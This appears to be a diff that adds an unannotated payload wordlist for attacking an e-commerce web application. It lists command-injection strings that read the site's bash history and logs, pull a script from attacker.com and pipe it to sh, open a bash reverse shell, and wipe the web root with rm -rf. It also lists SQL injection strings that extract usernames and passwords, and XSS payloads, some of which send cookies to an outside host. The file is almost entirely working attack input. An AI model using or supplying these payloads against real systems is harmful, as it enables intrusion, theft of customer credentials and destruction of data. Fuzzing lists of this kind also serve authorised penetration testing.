@@ -1,0 +1,150 @@
+; ls
+| ls
+&& ls
+`ls`
+; cat /var/www/ecommerce/.bash_history
+| cat /var/www/ecommerce/.bash_history
+&& cat /var/www/ecommerce/.bash_history
+`cat /var/www/ecommerce/.bash_history`
+; id
+| id
+&& id
+`id`
+; whoami
+| whoami
+&& whoami
+`whoami`
+; ping -c 4 127.0.0.1
+| ping -c 4 127.0.0.1
+&& ping -c 4 127.0.0.1
+`ping -c 4 127.0.0.1`
+; uname -a
+| uname -a
+&& uname -a
+`uname -a`
+; nc -lvp 1234
+| nc -lvp 1234
+&& nc -lvp 1234
+`nc -lvp 1234`
+; curl http://attacker.com/malicious_script.sh | sh
+| curl http://attacker.com/malicious_script.sh | sh
+&& curl http://attacker.com/malicious_script.sh | sh
+`curl http://attacker.com/malicious_script.sh | sh`
+; wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh
+| wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh
+&& wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh
+`wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh`
+; echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh
+| echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh
+&& echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh
+`echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh`
+; bash -i >& /dev/tcp/attacker.com/1234 0>&1
+| bash -i >& /dev/tcp/attacker.com/1234 0>&1
+&& bash -i >& /dev/tcp/attacker.com/1234 0>&1
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`
+; rm -rf /var/www/ecommerce/*
+| rm -rf /var/www/ecommerce/*
+&& rm -rf /var/www/ecommerce/*
+`rm -rf /var/www/ecommerce/*`
+; cat /var/log/apache2/access.log
+| cat /var/log/apache2/access.log
+' OR 1=1 --
+' OR 'a'='a' --
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL, username, password FROM users --
+' UNION SELECT NULL, product_name, product_price FROM products --
+' UNION SELECT NULL, username, email FROM users --
+' UNION SELECT NULL, database() --
+' UNION SELECT NULL, version() --
+' UNION SELECT NULL, table_name FROM information_schema.tables --
+' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password='admin') --
+' AND 1=1 --
+' AND 'a'='a' --
+' UNION SELECT NULL, product_name, description FROM products WHERE category_id=1 --
+' UNION SELECT NULL, username, password FROM users WHERE username='admin' --
+' UNION SELECT NULL, product_name, product_price FROM products WHERE product_id=1 --
+' OR 'a'='a' AND 1=1 --
+' AND 1=1 ORDER BY 1 --
+' AND 1=1 GROUP BY NULL --
+' UNION SELECT NULL, user_id, username FROM users --
+' UNION SELECT NULL, group_concat(username, ':', password) FROM users --
+' OR 1=1 AND SELECT user() --
+' OR 1=1 AND SELECT database() --
+' UNION SELECT NULL, order_id, user_id FROM orders --
+' AND 1=1 LIMIT 1,1 --
+' UNION SELECT NULL, NULL, category_name FROM categories --
+' OR 1=1 AND SLEEP(5) --
+' UNION SELECT NULL, username, email FROM users WHERE user_role='admin' --
+' UNION SELECT NULL, group_concat(product_name) FROM products --
+' AND 1=1 ORDER BY 2 --
+' UNION SELECT NULL, username, password, email FROM users --
+' OR 'a'='a' AND SELECT table_name FROM information_schema.tables --
+' OR '1'='1' AND SELECT table_name FROM information_schema.tables --
+' UNION SELECT NULL, user_id, order_total FROM orders --
+' AND 1=1 --+ LIMIT 1 --
+' OR '1'='1' AND SELECT * FROM users --
+' UNION SELECT NULL, username, email FROM users WHERE user_id=1 --
+' UNION SELECT NULL, username, password FROM users WHERE username='guest' --
+' UNION SELECT NULL, user_id, user_role FROM users WHERE username='admin' --
+' AND 1=1 AND SLEEP(10) --
+' UNION SELECT NULL, username, password FROM users WHERE username='customer' --
+' OR (SELECT COUNT(*) FROM users WHERE username='admin') > 0 --
+' UNION SELECT NULL, username, password, email FROM users WHERE user_role='admin' --
+' OR (SELECT COUNT(*) FROM products) > 1 --
+' UNION SELECT NULL, product_name, product_price FROM products WHERE product_id=1 --
+' AND 1=1 AND SELECT * FROM products --
+' UNION SELECT NULL, contact_name, contact_email FROM contact_form --
+' UNION SELECT NULL, order_id, product_name FROM order_details --
+' UNION SELECT NULL, username, user_id FROM users WHERE user_role='staff' --
+' OR 'a'='a' AND SELECT * FROM users WHERE username='admin' --
+' OR 1=1 AND SELECT * FROM users WHERE username='admin' AND password='admin' --
+<script>alert('XSS on eCommerce Site')</script>
+<img src="x" onerror="alert('XSS on eCommerce Site')">
+<a href="javascript:alert('XSS on eCommerce Site')">Click here</a>
+<div onmouseover="alert('XSS on eCommerce Site')">Hover over me</div>
+<script>eval('alert("XSS on eCommerce Site")')</script>
+<input type="text" value="<script>alert('XSS on eCommerce Site')</script>">
+<iframe src="javascript:alert('XSS on eCommerce Site');"></iframe>
+<svg/onload=alert('XSS on eCommerce Site')>
+<script>document.location='javascript:alert("XSS on eCommerce Site")'</script>
+<script>window.location="javascript:alert('XSS on eCommerce Site')"</script>
+<form action="javascript:alert('XSS on eCommerce Site')"></form>
+<img src="invalid" onerror="alert('XSS on eCommerce Site')">
+<input type="button" value="Click me" onclick="alert('XSS on eCommerce Site')">
+<button onclick="alert('XSS on eCommerce Site')">Click me</button>
+<textarea onfocus="alert('XSS on eCommerce Site')"></textarea>
+<input type="text" value="<img src=x onerror=alert('XSS on eCommerce Site')>">
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS on eCommerce Site')">
+<object data="javascript:alert('XSS on eCommerce Site')"></object>
+<audio src="javascript:alert('XSS on eCommerce Site')"></audio>
+<input type="image" src="x" onerror="alert('XSS on eCommerce Site')">
+<script>setTimeout('alert("XSS on eCommerce Site")', 100)</script>
+<script>window.alert('XSS on eCommerce Site');</script>
+<input type="file" onchange="alert('XSS on eCommerce Site')">
+<script>fetch('http://example.com?cookie=' + document.cookie)</script>
+<div style="width: expression(alert('XSS on eCommerce Site'));">
+<script>window.alert(document.cookie)</script>
+<script>document.cookie="eCommerceXSS=" + encodeURIComponent('test');</script>
+<script>new Image().src='javascript:alert("XSS on eCommerce Site")'</script>
+<script>document.body.innerHTML = '<img src=x onerror=alert("XSS on eCommerce Site")>';</script>
+<script>var img = new Image(); img.src = "http://example.com?cookie=" + document.cookie;</script>
+<script>document.body.innerHTML = '<iframe src="javascript:alert(\'XSS on eCommerce Site\')"></iframe>';</script>
+<input onfocus="alert('XSS on eCommerce Site')" autofocus>
+<video onplay="alert('XSS on eCommerce Site')"></video>
+<form action="javascript:alert('XSS on eCommerce Site')" method="POST"></form>
+<a href="javascript:document.location='javascript:alert(1)'">Go to Page</a>
+<textarea onblur="alert('XSS on eCommerce Site')"></textarea>
+<script>var x = document.createElement('script'); x.src = 'javascript:alert("XSS on eCommerce Site")'; document.body.appendChild(x);</script>
+<script>eval('alert("XSS on eCommerce Site")')</script>
+<input type="text" value="eCommerce <img src='x' onerror='alert(1)'>">
+<script>eval('alert(document.cookie)')</script>
+<img src="x" onerror="this.src='http://example.com/evil.jpg'">
+<style>@import 'javascript:alert(2)';</style>
+<button onclick="location='javascript:alert(3)'">Click Me</button>
+<form action="javascript:alert('XSS on eCommerce Site')" method="POST"></form>
+<audio controls autoplay><source src="javascript:alert('XSS on eCommerce Site')"></audio>
+<script>document.body.innerHTML = '<img src="x" onerror="alert(\'XSS\')">';</script>
+<script>location='javascript:alert("XSS on eCommerce Site")'</script>
+<script>window.location="javascript:alert('XSS on eCommerce Site')"</script>
+<input type="text" value="<svg><script>alert('XSS on eCommerce Site')</script></svg>">
+<script>window.alert('XSS on eCommerce Site')</script>
